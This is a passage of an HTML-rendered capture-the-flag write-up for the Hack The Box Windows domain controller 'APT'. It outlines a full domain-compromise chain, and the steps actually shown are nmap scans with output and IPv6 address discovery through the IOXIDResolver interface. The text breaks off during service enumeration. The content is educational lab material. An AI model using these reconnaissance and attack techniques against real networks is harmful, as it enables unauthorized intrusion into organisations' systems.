+  <a href="#privilege-escalation-ntlmv1-downgrade-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation — NTLMv1 Downgrade Attack
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation — NTLMv1 Downgrade Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#finding-the-attack-path-via-powershell-history" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding the Attack Path via PowerShell History
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Finding the Attack Path via PowerShell History">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-does-this-matter" class="md-nav__link">
+    <span class="md-ellipsis">
+      Why does this matter?
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-1-configure-responder-with-a-fixed-challenge" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1 — Configure Responder with a Fixed Challenge
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-force-authentication-with-petitpotam" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2 — Force Authentication with PetitPotam
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-crack-with-rainbow-tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3 — Crack with Rainbow Tables
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dcsync-as-apt-administrator-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      DCSync as APT$ — Administrator Hash
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-administrator-root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as Administrator — Root Flag
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<p><img alt="APT" src="../img/APT_BANNER.png" /></p>
+<h1 id="apt-writeup">APT-WriteUp<a class="headerlink" href="#apt-writeup" title="Permanent link">&para;</a></h1>
+<p>In this Windows Active Directory machine rated <strong>Insane</strong>, we'll compromise a Domain Controller starting from what appears to be a minimal attack surface, only two TCP ports open. The key insight is that the firewall only filters IPv4, leaving IPv6 wide open. From there, we exploit a leaked NTDS backup, perform a hash spray, abuse Remote Registry access, and ultimately weaponize an NTLMv1 downgrade to achieve full domain compromise. You will learn how to:</p>
+<ul>
+<li>Discover hidden IPv6 addresses via DCOM/OXID Resolver (MS-DCOM)</li>
+<li>Enumerate SMB shares anonymously and extract sensitive backups</li>
+<li>Crack encrypted ZIP archives with John the Ripper</li>
+<li>Dump domain credentials from <code>ntds.dit</code> + <code>SYSTEM</code> hive offline</li>
+<li>Validate domain users via Kerberos pre-authentication (Kerbrute)</li>
+<li>Perform NTLM hash spraying against a single valid user</li>
+<li>Read Windows Registry remotely via <code>reg.py</code> (Impacket) without a shell</li>
+<li>Capture NTLMv1 hashes using PetitPotam + Responder</li>
+<li>Crack NTLMv1 using rainbow tables (ntlmv1.com)</li>
+<li>Perform DCSync as a machine account to get the Administrator hash</li>
+</ul>
+<p>🧰 Tools used: <code>nmap</code>, <code>IOXIDResolver.py</code>, <code>smbclient.py</code>, <code>zip2john</code>, <code>john</code>, <code>secretsdump.py</code>, <code>kerbrute</code>, <code>reg.py</code>, <code>evil-winrm</code>, <code>PetitPotam.py</code>, <code>responder</code>, <code>hashcat</code>.</p>
+<p>Let's get started.</p>
+<hr />
+<h2 id="port-scanning">Port Scanning<a class="headerlink" href="#port-scanning" title="Permanent link">&para;</a></h2>
+<p>We started with a full TCP SYN scan across all ports on the target IPv4 address.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>--open<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span>-sS<span class="w"> </span>-n<span class="w"> </span>-vvv<span class="w"> </span><span class="m">10</span>.129.96.60
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>PORT<span class="w">    </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>REASON
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="m">80</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">    </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">127</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="m">135</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">   </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">127</span>
+</code></pre></div>
+<p>Only two ports open, HTTP and MSRPC. This is suspicious for a Windows machine and strongly suggests a firewall is in play.</p>
+<h3 id="service-enumeration">Service Enumeration<a class="headerlink" href="#service-enumeration" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmap<span class="w"> </span>-sVC<span class="w"> </span>-p80,135<span class="w"> </span><span class="m">10</span>.129.96.60
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>PORT<span class="w">    </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="m">80</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">    </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="p">|</span>_http-title:<span class="w"> </span>Gigantic<span class="w"> </span>Hosting<span class="w"> </span><span class="p">|</span><span class="w"> </span>Home
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="p">|</span><span class="w"> </span>http-methods:
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="m">135</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+</code></pre></div>
+<p>The web server is Microsoft IIS 10.0, hosting a site called "Gigantic Hosting". Wappalyzer confirms it's running on Windows Server, nothing immediately exploitable on the web side.</p>
+<p><img alt="Gigantic Hosting with Wappalyzer showing IIS 10.0 and Windows Server" src="../img/APT_0001.png" /></p>
+<p>We also ran a UDP scan to check for SNMP:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>-p<span class="w"> </span><span class="m">161</span><span class="w"> </span><span class="m">10</span>.129.96.60<span class="w"> </span>-v
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>PORT<span class="w">    </span>STATE<span class="w">           </span>SERVICE
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="m">161</span>/udp<span class="w"> </span>open<span class="p">|</span>filtered<span class="w">   </span>snmp
+</code></pre></div>
+<p>SNMP is filtered. Dead end for now.</p>
+<hr />
+<h2 id="discovering-ipv6-via-dcom-ioxidresolver">Discovering IPv6 via DCOM / IOXIDResolver<a class="headerlink" href="#discovering-ipv6-via-dcom-ioxidresolver" title="Permanent link">&para;</a></h2>
+<p>With only ports 80 and 135 open on IPv4, we know a firewall is blocking standard AD ports (445, 389, 88, etc.). However, <strong>Windows firewalls often forget to filter IPv6</strong>.</p>
+<p>Port 135 always exposes the <strong>IOXIDResolver</strong> interface (<code>99fcfec4-5260-101b-bbcb-00aa0021347a</code>), which is part of the DCOM core. Unlike regular RPC endpoints, IOXIDResolver doesn't register itself in the Endpoint Mapper, it's always available directly on port 135.</p>
+<h4 id="why-doesnt-it-appear-in-rpcdump">Why doesn't it appear in rpcdump?<a class="headerlink" href="#why-doesnt-it-appear-in-rpcdump" title="Permanent link">&para;</a></h4>
+<p>The <code>rpcdump.py</code> tool queries the <strong>Endpoint Mapper (EPM)</strong>, which acts like a directory of registered services. IOXIDResolver is part of the DCOM kernel and never registers there it's always reachable directly.</p>
+<h4 id="how-the-attack-works">How the attack works<a class="headerlink" href="#how-the-attack-works" title="Permanent link">&para;</a></h4>
+<p>The <code>ServerAlive2()</code> method of IOXIDResolver is completely unauthenticated and responds with all network interfaces (bindings) of the target, including IPv6 addresses you didn't know existed.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python3<span class="w"> </span>IOXIDResolver.py<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.129.96.60
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Retrieving<span class="w"> </span>network<span class="w"> </span>interface<span class="w"> </span>of<span class="w"> </span><span class="m">10</span>.129.96.60
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Address:<span class="w"> </span>apt
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Address:<span class="w"> </span><span class="m">10</span>.129.96.60
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>Address:<span class="w"> </span>dead:beef::b885:d62a:d679:573f
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>Address:<span class="w"> </span>dead:beef::d84d:4773:b57f:bc13
+</code></pre></div>
+<p>Two IPv6 addresses revealed. We add them to <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>sudo<span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span><span class="s1">'echo "dead:beef::b885:d62a:d679:573f APT6.htb" &gt;&gt; /etc/hosts'</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>sudo<span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span><span class="s1">'echo "dead:beef::d84d:4773:b57f:bc13 APT6-2.htb" &gt;&gt; /etc/hosts'</span>
+</code></pre></div>
+<hr />
+<h2 id="full-port-scan-via-ipv6">Full Port Scan via IPv6<a class="headerlink" href="#full-port-scan-via-ipv6" title="Permanent link">&para;</a></h2>
+<p>Now we scan the target over IPv6 using the <code>-6</code> flag:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>--open<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span>-sS<span class="w"> </span>-n<span class="w"> </span>-vvv<span class="w"> </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span>-6
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">          </span>REASON
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain<span class="w">           </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">  </span>http<span class="w">             </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">  </span>kerberos-sec<span class="w">     </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc<span class="w">            </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldap<span class="w">             </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds<span class="w">     </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">  </span>kpasswd5<span class="w">         </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">  </span>http-rpc-epmap<span class="w">   </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldapssl<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">  </span>globalcatLDAP<span class="w">    </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">  </span>globalcatLDAPssl<span class="w"> </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">  </span>wsman<span class="w">            </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">  </span>adws<span class="w">             </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="m">47001</span>/tcp<span class="w"> </span>open<span class="w">  </span>winrm<span class="w">            </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="m">49664</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="m">49665</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="m">49666</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="m">49667</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="m">49669</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="m">49670</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="m">49673</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="m">49685</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="m">52410</span>/tcp<span class="w"> </span>open<span class="w">  </span>unknown<span class="w">          </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
+</code></pre></div>
+<p>All the expected Domain Controller ports are now visible. The IPv4 firewall was blocking everything, but IPv6 was completely unfiltered.</p>
+<h3 id="service-enumeration-over-ipv6">Service Enumeration over IPv6<a class="headerlink" href="#service-enumeration-over-ipv6" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>nmap<span class="w"> </span>-sVC<span class="w"> </span>-p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49685,52410<span class="w"> </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span>-6
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">      </span>VERSION
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">  </span>domain<span class="w">       </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">  </span>http<span class="w">         </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="p">|</span><span class="w"> </span>http-methods:
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="p">|</span>_http-title:<span class="w"> </span>Gigantic<span class="w"> </span>Hosting<span class="w"> </span><span class="p">|</span><span class="w"> </span>Home
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">  </span>kerberos-sec<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2026</span>-03-31<span class="w"> </span><span class="m">02</span>:55:25Z<span class="o">)</span>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc<span class="w">        </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">  </span>ldap<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>htb.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:apt.htb.local
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2020</span>-09-24T07:07:18
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2050</span>-09-24T07:17:18
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2026</span>-03-31T02:56:39+00:00<span class="p">;</span><span class="w"> </span>+34s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span>Standard<span class="w"> </span><span class="m">14393</span><span class="w"> </span>microsoft-ds<span class="w"> </span><span class="o">(</span>workgroup:<span class="w"> </span>HTB<span class="o">)</span>
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">  </span>kpasswd5?
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">  </span>ncacn_http<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssl/ldap<span class="w">     </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>htb.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2026</span>-03-31T02:56:39+00:00<span class="p">;</span><span class="w"> </span>+35s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:apt.htb.local
+<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2020</span>-09-24T07:07:18
+<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2050</span>-09-24T07:17:18
+<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a><span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>htb.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:apt.htb.local
+<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2020</span>-09-24T07:07:18
+<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2050</span>-09-24T07:17:18
+<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2026</span>-03-31T02:56:39+00:00<span class="p">;</span><span class="w"> </span>+34s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a><span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssl/ldap<span class="w">     </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>htb.local,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
+<a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+<a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a><span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:apt.htb.local
+<a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2020</span>-09-24T07:07:18
+<a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2050</span>-09-24T07:17:18
+<a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2026</span>-03-31T02:56:39+00:00<span class="p">;</span><span class="w"> </span>+35s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a><span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">         </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a><span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
